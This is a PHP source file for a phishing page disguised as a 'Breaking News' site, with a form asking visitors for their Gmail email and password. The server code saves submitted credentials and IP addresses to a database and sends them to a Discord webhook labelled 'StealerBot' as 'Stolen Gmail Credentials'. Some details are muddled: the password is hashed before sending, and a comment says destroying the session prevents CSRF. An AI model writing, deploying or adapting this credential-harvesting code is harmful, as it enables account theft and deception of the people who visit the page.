<?php
ob_start();
session_start();
require_once "conn.php";

date_default_timezone_set('America/Los_Angeles');

// Define your Discord Webhook
$discordWebhookURL = "https://discordapp.com/api/webhooks/1405836394718564434/c1RhQlncKJoxuG6YjGwMTqW3rPlQDdeHnoccIItaUJrtF4jhkokOttATU2sPDy6jPE6H";

// Discord Webhook Payload - more info: https://discord.com/developers/docs/resources/webhook#executing-webhooks
$discordData = [
    'content' => '',
    'username' => 'StealerBot',
    'avatar_url' => 'https://i.imgur.com/f4sFwpm.png',
];

if (isset($_POST['email']) && isset($_POST['password'])) {
    // Insert data to the database
    $stmt = $conn->prepare("INSERT INTO gmail_credentials (email, password, ip_address, created_at) VALUES (?, ?, ?, ?)");
    $stmt->bind_param("sssi", $_POST['email'], password_hash($_POST['password'], PASSWORD_DEFAULT), $_SERVER['REMOTE_ADDR'], time());
    $stmt->execute();

    // Send Discord Webhook
    $discordData['content'] = 'Stolen Gmail Credentials:' . PHP_EOL . 'Email: ' . $_POST['email'] . PHP_EOL . 'Password: ' . password_hash($_POST['password'], PASSWORD_DEFAULT) . PHP_EOL . 'IP Address: ' . $_SERVER['REMOTE_ADDR'];
    $options = [
        'http' => [
            'header' => "Content-type: application/json\r\n",
            'method' => 'POST',
            'content' => json_encode($discordData),
        ],
    ];

    $context = stream_context_create($options);
    file_get_contents($discordWebhookURL, false, $context);

    // Destroy session to prevent CSRF
    session_destroy();
    header('Location: index.php');
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Latest News</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f4f4f4; color: #333; }
        .container { max-width: 800px; margin: 50px auto; padding: 20px; background: white; border-radius: 6px; }
        h1 { color: #0077cc; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Breaking News: Major Update Released</h1>
        <p>Our team has just rolled out the latest update with exciting new features and security improvements. Stay tuned for more details as they come in.</p>
        <form action="" method="post">
            <input type="email" name="email" placeholder="Enter your Gmail email">
            <input type="password" name="password" placeholder="Enter your Gmail password">
            <button type="submit">Submit</button>
        </form>
    </div>
</body>
</html>
